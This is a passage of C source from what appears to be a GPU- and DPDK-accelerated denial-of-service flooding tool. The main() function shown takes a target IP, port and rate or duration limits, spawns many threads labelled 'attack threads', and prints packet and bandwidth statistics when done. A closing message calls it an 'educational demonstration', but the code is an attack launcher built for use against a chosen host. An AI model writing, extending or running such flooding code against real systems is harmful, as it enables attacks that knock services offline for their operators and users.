        printf("   Unlimited:    %s 192.168.1.100 80\n", argv[0]);
        printf("   Packet rate:  %s 192.168.1.100 80 10M_pps\n", argv[0]);
        printf("   Bandwidth:    %s 192.168.1.100 80 5Gbps\n", argv[0]);
        printf("   Duration:     %s 192.168.1.100 80 300s\n", argv[0]);
        printf("\n💡 Units: K/M/G for scaling, pps/packets, bps/Mbps/Gbps, s/m/h\n");
        return 1;
    }
    
    // Initialize statistics
    memset(&g_stats, 0, sizeof(g_stats));
    g_stats.start_time = time(NULL);
    
    // Parse traffic specification
    if (parse_traffic_spec(argc == 4 ? argv[3] : NULL) != 0) {
        return 1;
    }
    
    // Detect system capabilities
    detect_system_capabilities();
    
    // Select performance tier
    g_caps.selected_tier = select_performance_tier();
    
    // User confirmation for advanced features
    if (!confirm_advanced_features()) {
        printf("🚫 User declined advanced features, falling back to GPU tier\n");
        if (g_caps.cuda_available) {
            g_caps.selected_tier = TIER_GPU;
        } else {
            g_caps.selected_tier = TIER_BASIC;
        }
    }
    
    // Initialize engines
    if (initialize_engines() != 0) {
        return 1;
    }
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);
    
    // Calculate optimal thread count
    int total_threads = g_caps.cpu_cores * 2; // Hyperthreading
    if (g_caps.selected_tier >= TIER_GPU) {
        total_threads = g_caps.gpu_count * MAX_THREADS_PER_GPU;
    }
    
    printf("\n🚀 [LAUNCH] Starting attack on %s:%s\n", argv[1], argv[2]);
    printf("============================================\n");
    printf("🧵 Attack threads: %d\n", total_threads);
    printf("📊 Performance tier: ");
    
    switch (g_caps.selected_tier) {
        case TIER_ULTIMATE: printf("ULTIMATE (All technologies)\n"); break;
        case TIER_DPDK: printf("DPDK (GPU + DPDK + io_uring)\n"); break;
        case TIER_GPU: printf("GPU (GPU + io_uring)\n"); break;
        case TIER_IOURING: printf("IO_URING (Async I/O)\n"); break;
        case TIER_BASIC: printf("BASIC (Multi-threaded)\n"); break;
    }
    
#ifdef CUDA_AVAILABLE
    // Start GPU generator threads
    pthread_t gpu_threads[MAX_GPUS];
    int gpu_ids[MAX_GPUS];
    
    if (g_caps.selected_tier >= TIER_GPU) {
        for (int i = 0; i < g_caps.gpu_count; i++) {
            gpu_ids[i] = i;
            pthread_create(&gpu_threads[i], NULL, gpu_generator_thread, &gpu_ids[i]);
        }
    }
#endif
    
    // Start monitoring thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, monitoring_thread, NULL);
    
    // Start attack threads
    pthread_t *attack_threads = malloc(total_threads * sizeof(pthread_t));
    int *thread_ids = malloc(total_threads * sizeof(int));
    
    for (int i = 0; i < total_threads; i++) {
        thread_ids[i] = i;
        pthread_create(&attack_threads[i], NULL, adaptive_attack_thread, &thread_ids[i]);
        usleep(5000); // Small delay between thread starts
    }
    
    printf("\n⚡ Attack commenced! Press Ctrl+C to stop.\n");
    printf("📈 Live statistics:\n\n");
    
    // Duration-based completion
    if (g_stats.mode == TRAFFIC_DURATION_LIMIT) {
        sleep((int)g_stats.target_value);
        g_running = false;
    }
    
    // Wait for threads to complete
    for (int i = 0; i < total_threads; i++) {
        pthread_join(attack_threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
#ifdef CUDA_AVAILABLE
    if (g_caps.selected_tier >= TIER_GPU) {
        for (int i = 0; i < g_caps.gpu_count; i++) {
            pthread_join(gpu_threads[i], NULL);
        }
    }
#endif
    
    // Final statistics
    double total_time = time(NULL) - g_stats.start_time;
    
    printf("\n🏁 [RESULTS] Attack completed successfully!\n");
    printf("==========================================\n");
    printf("⏱️  Total duration: %.1f seconds\n", total_time);
    printf("📦 Total packets: %lu\n", g_stats.packets_sent);
    printf("📊 Total bytes: %.2f MB\n", g_stats.bytes_sent / 1e6);
    printf("🔗 Total connections: %lu\n", g_stats.connections_total);
    printf("❌ Total errors: %lu\n", g_stats.errors);
    
    if (g_caps.selected_tier >= TIER_GPU) {
        printf("🎮 GPU generations: %lu\n", g_stats.gpu_generations);
    }
    
    printf("\n📈 Average Performance:\n");
    printf("   PPS: %.0f packets/second\n", g_stats.packets_sent / total_time);
    printf("   Bandwidth: %.2f Mbps\n", (g_stats.bytes_sent * 8) / (total_time * 1e6));
    
    // Cleanup
    cleanup_all_engines();
    free(attack_threads);
    free(thread_ids);
    
    printf("\n🎓 Educational demonstration completed!\n");
    printf("💡 This tool demonstrates the power of modern hardware\n");
    printf("   acceleration in cybersecurity applications.\n");
    
    return 0;
}